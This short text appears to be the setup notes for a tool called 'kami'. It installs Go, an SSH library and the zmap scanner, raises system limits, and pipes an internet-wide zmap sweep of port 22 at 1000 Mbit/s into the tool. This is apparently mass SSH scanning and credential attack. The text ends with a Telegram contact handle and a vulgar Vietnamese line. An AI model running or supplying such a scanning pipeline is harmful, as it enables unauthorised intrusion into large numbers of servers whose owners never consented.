snap install go --classic
go mod init kami
go get golang.org/x/crypto/ssh
apt install zmap -y
go install
go build
ulimit -n999999; ulimit -u999999; ulimit -e999999
zmap -p 22 -B1000M -i eth0 -T5 -q |./kami 22
ib box telegram : t.me/kami2k1
### xem sex ít thôi địt com mẹ 